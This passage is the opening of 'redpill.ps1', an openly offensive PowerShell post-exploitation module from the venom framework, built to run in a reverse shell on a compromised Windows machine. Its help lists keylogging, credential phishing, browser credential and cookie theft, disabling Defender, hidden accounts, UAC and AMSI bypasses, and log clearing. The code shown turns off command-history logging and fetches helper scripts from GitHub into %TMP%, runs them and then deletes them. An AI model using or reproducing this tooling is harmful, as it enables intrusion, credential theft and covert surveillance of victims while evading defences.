<#
.SYNOPSIS
   CmdLet to assiste reverse tcp shells in post-exploitation

   Author: r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: BitsTransfer
   PS cmdlet Dev version: v1.2.6

.DESCRIPTION
   This cmdlet belongs to the structure of venom v1.0.17.8 as a post-exploitation module.
   venom amsi evasion agents automatically downloads this CmdLet to %TMP% directory to be
   easily accessible in our reverse tcp shell (shell prompt). So, we just need to run this
   CmdLet with the desired parameters to perform various remote actions such as:
   
   System Enumeration, Start Local WebServer to read/browse/download files, Capture desktop
   screenshots, Capture Mouse/Keyboard Clicks/Keystrokes, Upload Files, Scans for EoP entrys,
   Persiste Agents on StartUp using 'beacon home' from 'xx' to 'xx' seconds technic, Etc ..

.NOTES
   powershell -File redpill.ps1 syntax its required to get outputs back in our reverse
   tcp shell connection, or else redpill auxiliary will not display outputs on rev shell.
   If you wish to test this CmdLet Locally then .\redpill.ps1 syntax will display outputs.

.EXAMPLE
   PS C:\> Get-Help .\redpill.ps1 -full
   Access This CmdLet Comment_Based_Help

.EXAMPLE
   PS C:\> powershell -File redpill.ps1 -Help parameters
   List all CmdLet parameters available

.EXAMPLE
   PS C:\> powershell -File redpill.ps1 -Help [ Parameter Name ]
   Detailed information about Selected Parameter

.INPUTS
   None. You cannot pipe objects into redpill.ps1

.OUTPUTS
   OS: Microsoft Windows 10 Home
   ------------------------------
   DomainName        : SKYNET\pedro
   ShellPrivs        : UserLand
   ConsolePid        : 7466
   IsVirtualMachine  : False
   Architecture      : 64 bits
   OSVersion         : 10.0.18363
   IPAddress         : 192.168.1.72
   System32          : C:\WINDOWS\system32
   DefaultWebBrowser : Firefox (predefined)
   CmdLetWorkingDir  : C:\Users\pedro\coding\pswork
   User-Agent        : Mozilla/4.0 (compatible; MSIE 8.0; Win32)

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/redpill.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Sherlock.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/tree/master/aux/Start-WebServer.ps1
    https://github.com/r00t-3xp10it/venom/blob/master/bin/meterpeter/mimiRatz/CredsPhish.ps1
    https://github.com/r00t-3xp10it/venom/wiki/CmdLine-&-Scripts-for-reverse-TCP-shell-addicts
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$psgetsys="false", [string]$Filter="false", [string]$Parent="lsass", [string]$CmdLine="false",
   [string]$clipboard="false", [int]$CaptureTime='30', [int]$GetStrings='2', [string]$Forensic="false",
   [string]$StartDir="$Env:USERPROFILE", [string]$StartWebServer="false", [string]$GetConnections="false",
   [string]$WifiPasswords="false", [string]$GetInstalled="false", [string]$GetPasswords="false",
   [string]$SetPath="$Env:WINDIR\System32\calc.exe", [string]$Database="$Env:TMP\clipboard.log",
   [string]$Mouselogger="false", [string]$Destination="false", [string]$GetBrowsers="false",
   [string]$ProcessName="false", [string]$CleanTracks="false", [string]$GetDnsCache="false",
   [string]$Parameters="false", [string]$PhishCreds="false", [string]$GetProcess="false",
   [string]$ApacheAddr="false", [string]$Storage="$Env:TMP", [string]$SpeakPrank="false",
   [string]$TaskName="false", [string]$Keylogger="false", [string]$PingSweep="false",
   [string]$FileMace="false", [string]$GetTasks="false", [string]$Persiste="false",
   [string]$BruteZip="false", [string]$NetTrace="false", [string]$SysInfo="false",
   [string]$GetLogs="false", [string]$Upload="false", [string]$Camera="false",
   [string]$Child="$Env:WINDIR\System32\cmd.exe", [string]$Clean="false",
   [string]$EOP="false", [string]$MsgBox="false", [string]$Range="1,255",
   [string]$Date="false", [string]$ADS="false", [string]$Help="false",
   [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
   [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
   [int]$BeaconTime='10', [int]$Interval='1', [int]$NewEst='3',
   [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='18',
   [string]$FolderRigths="false", [string]$GroupName="false",
   [string]$Extension="false", [string]$FilePath="false",
   [string]$UserName="false", [string]$Password="false",
   [string]$Action="false", [string]$CsOnTheFly="false",
   [string]$MetaData="false", [int]$ButtonType='0',
   [int]$Limmit='5', [string]$AppLocker="false",
   [string]$Dicionary="$Env:TMP\passwords.txt",
   [string]$Uri="$env:TMP\SpawnPowershell.cs",
   [string]$OutFile="$Env:TMP\Installer.exe",
   [string]$GetCounterMeasures="false",
   [string]$Domain="www.facebook.com",
   [string]$ServiceName="WinDefend",
   [string]$ScriptBlockLogging="ON",
   [string]$PasswordSpray="false",
   [string]$CookieHijack="False",
   [string]$UserAccount="false",
   [string]$PayloadURL="false",
   [string]$LiveStream="false",
   [string]$HiddenUser="false",
   [string]$Execute="cmd.exe",
   [string]$DisableAV="false",
   [string]$EnableRDP="false",
   [string]$HideMyAss="false",
   [string]$IpAddress="false",
   [string]$GetAdmin="false",
   [string]$SetText="Eureka",
   [string]$ToIPaddr="false",
   [string]$DnsSpoof="false",
   [string]$TimeOpen="false",
   [string]$GetSkype="False",
   [string]$LogFile="false",
   [string]$IconSet="False",
   [string]$NoAmsi="false",
   [string]$PSargs="false",
   [string]$Query="false",
   [string]$UacMe="false",
   [string]$Verb="false",
   [string]$Port="false",
   [string]$Url="false",
   [int]$DelayTime='30',
   [int]$SPort='8080',
   [string]$Id="false",
   [string]$Try='1'
)


## Var declarations
$CmdletVersion = "v1.2.6"
$Remote_hostName = hostname
$Working_Directory = ($pwd).Path.ToString()
$ErrorActionPreference = "SilentlyContinue"
$OsVersion = [System.Environment]::OSVersion.Version
$host.UI.RawUI.WindowTitle = "@redpill $CmdletVersion {SSA@RedTeam}"
$Address = (## Get Local IpAddress
    Get-NetIPConfiguration|Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.status -ne "Disconnected"
    }
).IPv4Address.IPAddress
$Banner = @"

             * Reverse TCP Shell Auxiliary Powershell Module *
     _________ __________ _________ _________  o  ____      ____      
    |    _o___)   /_____/|     O   \    _o___)/ \/   /_____/   /_____ 
    |___|\____\___\%%%%%'|_________/___|%%%%%'\_/\___\_____\___\_____\   
          Author: r00t-3xp10it - SSAredTeam @2021 - Version: $CmdletVersion
            Help: powershell -File redpill.ps1 -Help Parameters

      
"@;
Clear-Host
Write-Host "$Banner" -ForegroundColor Blue
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

If($Help -ieq "Parameters"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - List ALL CmdLet Parameters Available

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -Help Parameters
   #>

Write-Host "  Syntax : powershell -File redpill.ps1 [ -Parameter ] [ Argument ]"
Write-Host "  Example: powershell -File redpill.ps1 -SysInfo Verbose -Screenshot 2"
Write-Host "`n  P4rameters        @rguments                Descripti0n" -ForegroundColor Green
Write-Host "  ---------------   ------------             ---------------------------------------"
$ListParameters = @"
  -SysInfo          Enum|Verbose             Quick System Info OR Verbose Enumeration
  -GetConnections   Enum|Verbose             Enumerate Remote Host Active TCP Connections
  -GetDnsCache      Enum|Clear               Enumerate\Clear remote host DNS cache entrys
  -GetInstalled     Enum                     Enumerate Remote Host Applications Installed
  -GetProcess       Enum|Kill|Tokens         Enumerate OR Kill Remote Host Running Process(s)
  -GetTasks         Enum|Create|Delete       Enumerate\Create\Delete Remote Host Running Tasks
  -GetLogs          Enum|Verbose|Yara|Clear  Enumerate eventvwr logs OR Clear All event logs
  -GetBrowsers      Enum|Verbose|Creds       Enumerate Installed Browsers and Versions OR Verbose 
  -GetSkype         Contacts|DomainUsers     Enumerating and attacking federated Skype
  -Screenshot       1                        Capture 1 Desktop Screenshot and Store it on %TMP%
  -Camera           Enum|Snap                Enum computer webcams OR capture default webcam snapshot 
  -StartWebServer   Python|Powershell        Downloads webserver to %TMP% and executes the WebServer.
  -Keylogger        Start|Stop               Start OR Stop recording remote host keystrokes
  -MouseLogger      Start                    Capture Screenshots of Mouse Clicks for 10 seconds
  -LiveStream       Bind|Reverse|Stop        Nishang script to streaming a target desktop using MJPEG
  -PhishCreds       Start|Brute              Promp current user for a valid credential and leak captures
  -GetPasswords     Enum|Dump                Enumerate passwords of diferent locations {Store|Regedit|Disk}
  -PasswordSpray    Spray                    Password spraying attack against accounts in Active Directory!
  -WifiPasswords    Dump|ZipDump             Enum Available SSIDs OR ZipDump All Wifi passwords
  -EOP              Enum|Verbose             Find Missing Software Patchs for Privilege Escalation
  -ADS              Enum|Create|Exec|Clear   Hidde scripts {txt|bat|ps1|exe} on `$DATA records (ADS)
  -BruteZip         `$Env:TMP\arch.zip        Brute force Zip archives with the help of 7z.exe
  -Upload           script.ps1               Upload script.ps1 from attacker apache2 webroot
  -Persiste         `$Env:TMP\script.ps1      Persiste script.ps1 on every startup {BeaconHome}
  -CleanTracks      Clear|Paranoid           Clean disk artifacts left behind {clean system tracks}
  -AppLocker        Enum|WhoAmi|TestBat      Enumerate AppLocker Directorys with weak permissions
  -FileMace         `$Env:TMP\test.txt        Change File Mace {CreationTime,LastAccessTime,LastWriteTime}
  -MetaData         `$Env:TMP\test.exe        Display files \ applications description (metadata)
  -psgetsys         Enum|Auto|Impersonate    spawn a process under a different parent process!
  -MsgBox           "Hello World."           Spawns "Hello World." msgBox on local host {wscriptComObject}
  -SpeakPrank       "Hello World."           Make remote host speak user input sentence {prank}
  -PingSweep        Enum|Verbose             Enumerate active IP Addr (and ports) of Local Lan
  -NetTrace         Enum                     Agressive sytem enumeration with netsh {native}
  -DnsSpoof         Enum|Redirect|Clear      Redirect Domain Names to our Phishing IP address
  -DisableAV        Query|Start|Stop         Disable Windows Defender Service (WinDefend)
  -HiddenUser       Query|Create|Delete      Query \ Create \ Delete Hidden User Accounts
  -CsOnTheFly       https://../script.cs     Download\Compile (to exe) and exec CS scripts
  -CookieHijack     Dump|History             Edge|Chrome browser Cookie Hijacking tool
  -UacMe            Bypass|Elevate|Clean     UAC bypass|EOP by dll reflection! (cmstp.exe)
  -GetAdmin         Check|Exec               Elevate sessions from UserLand to Administrator!
  -NoAmsi           List|TestAll|Bypass      Test AMS1 bypasses or simple execute one bypass
  -Clipboard        Enum|Capture|Prank       Capture clipboard text\file\image\audio contents!
  -GetCounterMeasures Enum|verbose           List common security processes\pid's running!

"@;
echo $ListParameters > $Env:TMP\mytable.mt
Get-Content -Path "$Env:TMP\mytable.mt"
Remove-Item -Path "$Env:TMP\mytable.mt" -Force
Write-Host "  Help: powershell -File redpill.ps1 -Help [ Parameter Name ]     " -ForeGroundColor black -BackGroundColor White
Write-Host ""
}

If($Sysinfo -ieq "Enum" -or $Sysinfo -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerates remote host basic system info

   .DESCRIPTION
      System info: IpAddress, OsVersion, OsFlavor, OsArchitecture,
      WorkingDirectory, CurrentShellPrivileges, ListAllDrivesAvailable
      PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
      UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..

   .NOTES
      Optional dependencies: curl (geolocation) icacls (file permissions)
      -HideMyAss "True" - Its used to hide the public ip address display!
      If sellected -sysinfo "verbose" then established & listening connections
      will be listed insted of list only the established connections (TCP|IPV4)

   .Parameter Sysinfo
      Accepts arguments: Enum, Verbose (default: Enum)

   .Parameter HideMyAss
      Accepts argument: True, False (default: False)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Enum
      Remote Host Quick Enumeration Module

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Enum -HideMyAss True
      Remote Host Quick Enumeration Module (hide public ip addr displays)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -SysInfo Verbose
      Remote Host Detailed Enumeration Module
   #>

   ## Download Sysinfo.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\Sysinfo.ps1")){## Download Sysinfo.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1 -Destination $Env:TMP\Sysinfo.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\Sysinfo.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 24){## Corrupted download detected => DefaultFileSize: 24,63671875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\Sysinfo.ps1"){Remove-Item -Path "$Env:TMP\Sysinfo.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($Sysinfo -ieq "Enum"){
      powershell -File "$Env:TMP\sysinfo.ps1" -SysInfo Enum -HideMyAss "$HideMyAss"
   }ElseIf($Sysinfo -ieq "Verbose"){
      powershell -File "$Env:TMP\sysinfo.ps1" -SysInfo Verbose -HideMyAss "$HideMyAss"
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\sysinfo.ps1"){Remove-Item -Path "$Env:TMP\sysinfo.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\OutlookEmails.log"){Remove-Item -Path "$Env:TMP\OutlookEmails.log" -Force}

}

If($GetConnections -ieq "Enum" -or $GetConnections -ieq "Verbose"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Gets a list of ESTABLISHED connections (TCP)
   
   .DESCRIPTION
      Enumerates ESTABLISHED TCP connections and retrieves the
      ProcessName associated from the connection PID identifier
    
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Enum
      Enumerates All ESTABLISHED TCP connections (IPV4 only)

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetConnections Verbose
      Retrieves process info from the connection PID (Id) identifier

   .OUTPUTS
      Proto  Local Address          Foreign Address        State           Id
      -----  -------------          ---------------        -----           --
      TCP    127.0.0.1:58490        127.0.0.1:58491        ESTABLISHED     10516
      TCP    192.168.1.72:60547     40.67.254.36:443       ESTABLISHED     3344
      TCP    192.168.1.72:63492     216.239.36.21:80       ESTABLISHED     5512

      Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
      -------  ------    -----      -----     ------     --  -- -----------
          671      47    39564      28452       1,16  10516   4 firefox
          426      20     5020      21348       1,47   3344   0 svchost
         1135      77   252972     271880      30,73   5512   4 powershell
   #>

   ## Download GetConnections.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetConnections.ps1")){## Download GetConnections.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1 -Destination $Env:TMP\GetConnections.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetConnections.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 10){## Corrupted download detected => DefaultFileSize: 10,4345703125/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetConnections.ps1"){Remove-Item -Path "$Env:TMP\GetConnections.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetConnections -ieq "Enum"){
      powershell -File "$Env:TMP\GetConnections.ps1" -Action Enum -Query $Query -LogFile $LogFile
   }ElseIf($GetConnections -ieq "Verbose"){
      powershell -File "$Env:TMP\GetConnections.ps1" -Action Verbose -Query $Query -LogFile $LogFile
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetConnections.ps1"){Remove-Item -Path "$Env:TMP\GetConnections.ps1" -Force}
}

If($GetDnsCache -ieq "Enum" -or $GetDnsCache -ieq "Clear"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate remote host DNS cache entrys
      
   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Enum

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetDnsCache Clear
      Clear Dns Cache entrys {delete entrys}

   .OUTPUTS
      Entry                           Data
      -----                           ----
      example.org                     93.184.216.34
      play.google.com                 216.239.38.10
      www.facebook.com                129.134.30.11
      safebrowsing.googleapis.com     172.217.21.10
   #>

   ## Download GetDnsCache.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetDnsCache.ps1")){## Download GetDnsCache.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetDnsCache.ps1 -Destination $Env:TMP\GetDnsCache.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetDnsCache.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 2){## Corrupted download detected => DefaultFileSize: 2,6640625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetDnsCache.ps1"){Remove-Item -Path "$Env:TMP\GetDnsCache.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetDnsCache -ieq "Enum"){
      powershell -File "$Env:TMP\GetDnsCache.ps1" -GetDnsCache Enum
   }ElseIf($GetDnsCache -ieq "Clear"){
      powershell -File "$Env:TMP\GetDnsCache.ps1" -GetDnsCache Clear
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetDnsCache.ps1"){Remove-Item -Path "$Env:TMP\GetDnsCache.ps1" -Force}
}

If($GetBrowsers -ieq "Enum" -or $GetBrowsers -ieq "Verbose" -or $GetBrowsers -ieq "Creds"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Leak Installed Browsers Information

   .NOTES
      This module downloads GetBrowsers.ps1 from venom
      GitHub repository into remote host %TMP% directory,
      And identify install browsers and run enum modules.

   .Parameter GetBrowsers
      Accepts Enum, Verbose and Creds @arguments

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
      Identify installed browsers and versions

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Verbose
      Run enumeration modules againts ALL installed browsers

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetBrowsers Creds
      Dump Stored credentials from all installed browsers

   .OUTPUTS
      Browser   Install   Status   Version         PreDefined
      -------   -------   ------   -------         ----------
      IE        Found     Stoped   9.11.18362.0    False
      CHROME    False     Stoped   {null}          False
      FIREFOX   Found     Active   81.0.2          True
   #>

   ## Download EnumBrowsers.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1")){## Download EnumBrowsers.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/EnumBrowsers.ps1 -Destination $Env:TMP\EnumBrowsers.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\EnumBrowsers.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,5556640625KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetBrowsers -ieq "Enum"){
      powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Enum
   }ElseIf($GetBrowsers -ieq "Verbose"){
      powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Verbose
   }ElseIf($GetBrowsers -ieq "Creds"){
      powershell -File "$Env:TMP\EnumBrowsers.ps1" -GetBrowsers Creds
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\EnumBrowsers.ps1"){Remove-Item -Path "$Env:TMP\EnumBrowsers.ps1" -Force}
}

If($GetInstalled -ieq "Enum"){

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - List remote host applications installed

   .DESCRIPTION
      Enumerates appl installed and respective versions

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetInstalled Enum

   .OUTPUTS
      DisplayName                   DisplayVersion     
      -----------                   --------------     
      Adobe Flash Player 32 NPAPI   32.0.0.314         
      ASUS GIFTBOX                  7.5.24
      StarCraft II                  1.31.0.12601
   #>

   $RawHKLMkey = "HKLM:\Software\" + "Wow6432Node\Microsoft\Windows\" + "CurrentVersion\Uninstall\*" -Join ''
   Write-Host "[i] Applications installed on $Env:COMPUTERNAME\$Env:USERNAME!" -ForegroundColor Green;Start-Sleep -Seconds 1
   Get-ItemProperty "$RawHKLMkey" | Select-Object DisplayName,DisplayVersion,Publisher,InstallDate | Format-Table -AutoSize
   Start-Sleep -Seconds 1
}

If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tokens"){

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Enumerate/Kill running process/Tokens

   .DESCRIPTION
      This CmdLet enumerates 'All' running process if used
      only the 'Enum' @arg IF used -ProcessName parameter
      then cmdlet 'kill' or 'enum' the sellected processName.

   .NOTES
      -GetProcess Tokens @argument requires Admin privileges

   .Parameter GetProcess
      Accepts arguments: Enum, Kill and Tokens

   .Parameter ProcessName
      Accepts the process name to be query or kill

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum
      Enumerate ALL Remote Host Running Process(s)

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox.exe
      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
      Kill Remote Host firefox.exe Running Process

   .EXAMPLE
      PC C:\> powershell -File redpill.ps1 -GetProcess Tokens
      Enum ALL user process tokens and queries them for details

   .OUTPUTS
      Id Name                  ProductVersion    StartTime            Description
      -- ----                  --------------    ---------            ----------- 
      8524 ACMON                 1, 0, 0, 0        17/07/2021 22:01:19  ACMON                                      
      1724 ApplicationFrameHost  10.0.19041.746    17/07/2021 21:59:30  Application Frame Host                     
      7904 AsusTPLoader          1.0.51.0          17/07/2021 21:59:12  ASUS Smart Gesture Loader
      5092 dllhost               10.0.19041.546    17/07/2021 21:58:53  COM Surrogate
      9300 HxOutlook             16.0.13426.20910  17/07/2021 23:01:51  Microsoft Outlook
      4416 WinStore.App          0.0.0.0           17/07/2021 22:02:51  Store 
      6272 YourPhone             1.21052.124.0     17/07/2021 21:58:36  YourPhone
   #>

   ## Download GetProcess.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetProcess.ps1")){## Download GetProcess.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1 -Destination $Env:TMP\GetProcess.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetProcess.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,84765625/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetProcess -ieq "Enum" -and $ProcessName -ieq "false"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum
   }ElseIf($GetProcess -ieq "Enum" -and $ProcessName -ne "false"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum -ProcessName $ProcessName -Verb $Verb
   }ElseIf($GetProcess -ieq "Kill"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess kill -ProcessName $ProcessName
   }ElseIf($GetProcess -ieq "Tokens"){
      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Tokens
   }

   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
   If(Test-Path -Path "$Env:TMP\Get-OSTokenInformation.ps1"){Remove-Item -Path "$Env:TMP\Get-OSTokenInformation.ps1" -Force}
}

If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"){

   <#
   .SYNOPSIS
     Author: @r00t-3xp10it
     Helper - Enumerate\Create\Delete running tasks

   .DESCRIPTION
      This module enumerates remote host running tasks
      Or creates a new task Or deletes existence tasks

   .NOTES
      Required Dependencies: cmd|schtasks {native}
      Remark: Module parameters are auto-set {default}
      Remark: Tasks have the default duration of 9 hours.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Enum

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Create
      Use module default settings to create the demo task

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Delete -TaskName mytask
      Deletes mytask taskname

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"

   .OUTPUTS
      TaskName                                 Next Run Time          Status
      --------                                 -------------          ------
      ASUS Smart Gesture Launcher              N/A                    Ready          
      CreateExplorerShellUnelevatedTask        N/A                    Ready          
      OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready   
   #>

   ## Download GetTasks.ps1 from my GitHub
   If(-not(Test-Path -Path "$Env:TMP\GetTasks.ps1")){## Download GetTasks.ps1 from my GitHub repository
      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetTasks.ps1 -Destination $Env:TMP\GetTasks.ps1 -ErrorAction SilentlyContinue|Out-Null
      ## Check downloaded file integrity => FileSizeKBytes
      $SizeDump = ((Get-Item -Path "$Env:TMP\GetTasks.ps1" -EA SilentlyContinue).length/1KB)
      If($SizeDump -lt 11){## Corrupted download detected => DefaultFileSize: 11,232421875/KB
         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
         If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
      }   
   }

   ## Run auxiliary module
   If($GetTasks -ieq "Enum")
   {
      If($TaskName -ieq "false")
      {
         powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Enum
      }
      Else
      {
         powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Enum -TaskName "$TaskName"      
      }

   }
   ElseIf($GetTasks -ieq "Create")
   {
       If($Exec -ieq "false"){$Exec = "cmd.exe"}
       If($TaskName -ieq "false"){$TaskName = "RedPillTask"}
       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Create -TaskName $TaskName -Interval $Interval -Exec $Exec -Persiste $Persiste
   }
   ElseIf($GetTasks -ieq "Delete")
   {
       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Delete -TaskName $TaskName
   }

   Write-Host ""
   ## Clean Old files left behind
   If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
}


If($GetLogs -ieq "Enum" -or $GetLogs -ieq "DeleteAll" -or $GetLogs -ieq "Verbose" -or $getLogs -ieq "Yara"){
If($NewEst -lt "1"){$NewEst = "3"} ## Set the min logs to display

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Enumerate eventvwr logs OR Clear All event logs

   .NOTES
      Required Dependencies: wevtutil {native}
      The Clear @argument requires Administrator privs
      on shell to be abble to 'Clear' Eventvwr entrys.

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Enum
      Lists ALL eventvwr categorie entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
      List the newest 3(default) Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
      List the newest 28 Eventvwr Powershell\Application\System entrys

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 28
      List -NewEst "28" logfiles with Id: 59,300,4104

   .EXAMPLE
      PS C:\> powershell -File redpill.ps1 -GetLogs DeleteAll
      Remark: Clear @arg requires Administrator privs on shell

   .OUTPUTS
      LogMode  MaximumSizeInBytes RecordCount LogName
      -------  ------------------ ----------- -------
      Circular           15728640        3978 Windows PowerShell
      Circular           20971520        1731 System
      Circular            1052672           0 Internet Explorer
      Circular           20971520        1122 Application
      Circular            1052672        1729 Microsoft-Windows-WMI-Activity/Operational
      Circular            1052672         520 Microsoft-Windows-Windows Defender/Operational
      Circular           15728640         719 Microsoft-Windows-PowerShell/Operational
      Circular            1052672         499 Microsoft-Windows-Bits-Client/Operational
